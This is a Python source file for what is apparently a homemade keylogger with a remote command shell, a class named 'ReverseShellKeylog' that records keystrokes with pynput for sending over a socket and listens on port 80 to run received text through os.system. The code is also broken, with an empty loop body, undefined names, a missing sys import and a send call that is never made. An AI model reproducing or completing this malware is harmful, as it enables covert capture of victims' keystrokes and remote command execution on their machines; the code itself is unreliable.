import socket
import threading
import os
import pynput
class UnconfiguredMonitorFunction(Exception):pass
def monitor(self):
	monitor.last = self
	ReverseShellKeylog.detect.self = self
	self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	return self
monitor.last = None
class ReverseShellKeylog(threading.Thread):
	__slots__ = []
	HOST = ("",80)
	KEYEND = "endSession"
	KEYEND_LEN = len(ReverseShellKeylog.KEYEND)
	
	def __init__(self,daemon=True):
		thread.Threading.__init__(self,daemon=daemon)
		self.MAP = {}
	@staticmethod
	def detect(key):
		
		if ReverseShellKeylog.detect.static == len(ReverseShellKeylog.KEYEND):
			ReverseShellKeylog.detect.self.running = False
		if type(key) == pynput.keyboard.Key:
			ReverseShellKeyLog.detect.static = 0
			key = key.value
		elif type(key) == pynput.keyboard._win32.KeyCode:
			try:
				if str(key)[0] == ReverseShellKeylog.KEYEND[ReverseShellKeylog.detect.static]:ReverseShellKeylog.detect.static += 1
			except Exception:
				print("An error have occured...")
				ReverseShellKeylog.detect.static = 0
		data = bytes(key.vk,"utf-8")
		if monitor.last == None:
			raise UnconfiguredMonitorFunction("monitor(self) was not called before running keylog...")
			return sys.exit(1)
		monitor.last.sendall
	def start(self):
		self.running = True
		return super().start()
	def processForCMD(self,data):
		BOOL = data in self.MAP
		return data,BOOL
		#waste of line, memory
	def run(self):
		while self.running:
			
	def receiveReverseShell(self):
		with socket.create_server((socket.gethostbyname(socket.gethostname() ), 80)) as SOCKET:
			SOCKET.listen()
			conn, addr = socket.accept()
			data = conn.recv(1024)
			data = self.processForCMD(data.decode())
			if data[1]:
				self.MAP[data[0]]()
			else:
				os.system(data[0])
ReverseShellKeylog.detect.static = 0

def main(argv = []):
	KEYLOG = ReverseShellKeylog()
	monitor(KEYLOG)
	KEYLOG.start()
	KEYLOG.join()
	
	
	
	
	
	return 0
if __name__ == "__main__":
	main(sys.argv)
